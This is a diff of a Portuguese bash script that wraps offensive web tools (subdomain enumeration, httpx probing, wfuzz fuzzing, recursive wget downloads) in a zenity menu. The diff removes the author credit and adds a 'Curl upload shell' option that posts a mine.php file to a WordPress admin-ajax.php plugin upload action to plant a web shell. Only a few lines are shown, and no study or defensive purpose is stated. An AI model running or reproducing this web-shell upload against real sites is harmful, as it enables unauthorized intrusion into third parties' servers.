@@ -1,5 +1,4 @@
 #!/bin/bash
-# Desenvolvido por: Fábio Assis
 go=$(zenity --list \
 --title="R1" \
 --text="Selecione uma opção:" \
@@ -30,6 +29,7 @@ FALSE "Ler arquivo php de diretório" \
 FALSE "Ler arquivo php com token" \
 FALSE "wfuzz saber filtro" \
 FALSE "Wfuzz selecionar filtro" \
+FALSE "Curl upload shell" \
 TRUE  "Sair" )
 
 case $go in
@@ -214,17 +214,21 @@ cat sub-curl.txt |zenity --title "Conteúdo de: sub-curl.txt" --text-info --edit
 clear  
 ;;
 "Encontrar subdomínios-subfinder")
+
 dominio=$(zenity --entry  --title "Dominio" --text "Digite o dominio:")
 subfinder -all  -d  "$dominio" -silent  -o sub.txt
 echo "foi criado um arquivo chamado sub.txt "
 ;;
 "Mudar inicio de de subdominios de wordlist")
-zenity --info --title="Dica" --text="use o comando cat wordlist | sed 's/^/subdominio./' > wordlist2" --no-wrap
+dominio=$(zenity --entry  --title "Dominio" --text "Digite palavra inicial para subdominio:")
+wlist=$(zenity --file-selection --title  "Selecione a wordlist desejada:" --filename=".") 
+cat "$wlist" | sed "s/^/$dominio./" > wordlist2
+zenity --info --title="informação" --text="A wordlist2 foi criada"
 ;;
 "Usar o httpx-toolkit sem ip")
-lista=$(zenity --entry  --title "Dominio" --text "Digite o nome da lista com subdomínios:")
+lista=$(zenity --file-selection --title  "SELECIONE a lista de subdomínio desejada:" --filename=".") 
 httpx-toolkit -l "$lista" -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML,like Gecko) Chrome/108.0.0.0 Safari/537.36" -silent > sites.txt
-zenity --info --title="n=Nova lista" --text="A lista sites.txt foi criada" --no-wrap
+zenity --info --title="Nova lista" --text="A lista sites.txt foi criada" --no-wrap
 ;;
 "Usar o httpx-toolkit com ip")
 lista=$(zenity --entry  --title "Dominio" --text "Digite o nome da lista com subdomínios:")
@@ -463,7 +467,7 @@ AGENT="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like
 diretorio=$(zenity --entry  --title "diretório" --text "Digite o nome do diretório que quer criar:")
 mkdir "$diretorio" 
 ext=$(zenity --entry  --title "Extenssão" --text "Digite a .extenssão que quer baixar:")
-url=$(zenity --entry  --title "url" --text "Digite a URL do Site:")
+url=$(zenity --entry  --title "url" --text "Digite a URL/subdir/arq.php do Site:")
 echo "Entre no diretório $diretorio e cole o comando: wget --user-agent=\""$AGENT"\" -r -np -nd  -A \""$ext"\"  "$url" " > comando.txt
 cat comando.txt |zenity --title "Cole dentro de $diretorio" --text-info --editable --width=800 --height=400  2>/dev/null
 clear  
@@ -526,6 +530,10 @@ vl=$(zenity --entry  --title "url" --text "digite o valor do parametro a ser fil
 uagent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML,like Gecko) Chrome/108.0.0.0 Safari/537.30"
 wlist=$(zenity --file-selection --title  "SELECIONE A WORDLIST" --filename=".")
 echo wfuzz -c -w "$wlist" -d \""token=$token&source=FUZZ"\" -H \""User-Agent:$uagent" \" -s "$tp" "--$pr" "$vl"  "$url/$sub/$arq" |zenity --title "Copie e cole" --text-info --editable  --width=1000 --height=600 
+;;
+"Curl upload shell")
+url=$(zenity --title url --text "Digite a url" --entry )
+curl -k -X POST -F "action=upload" -F "Filedata=@./mine.php" -F "action=nm_webcontact_upload_file" http://"$url"/wordpress/wp-admin/admin-ajax.php s
 ;;
 "Sair")
 clear
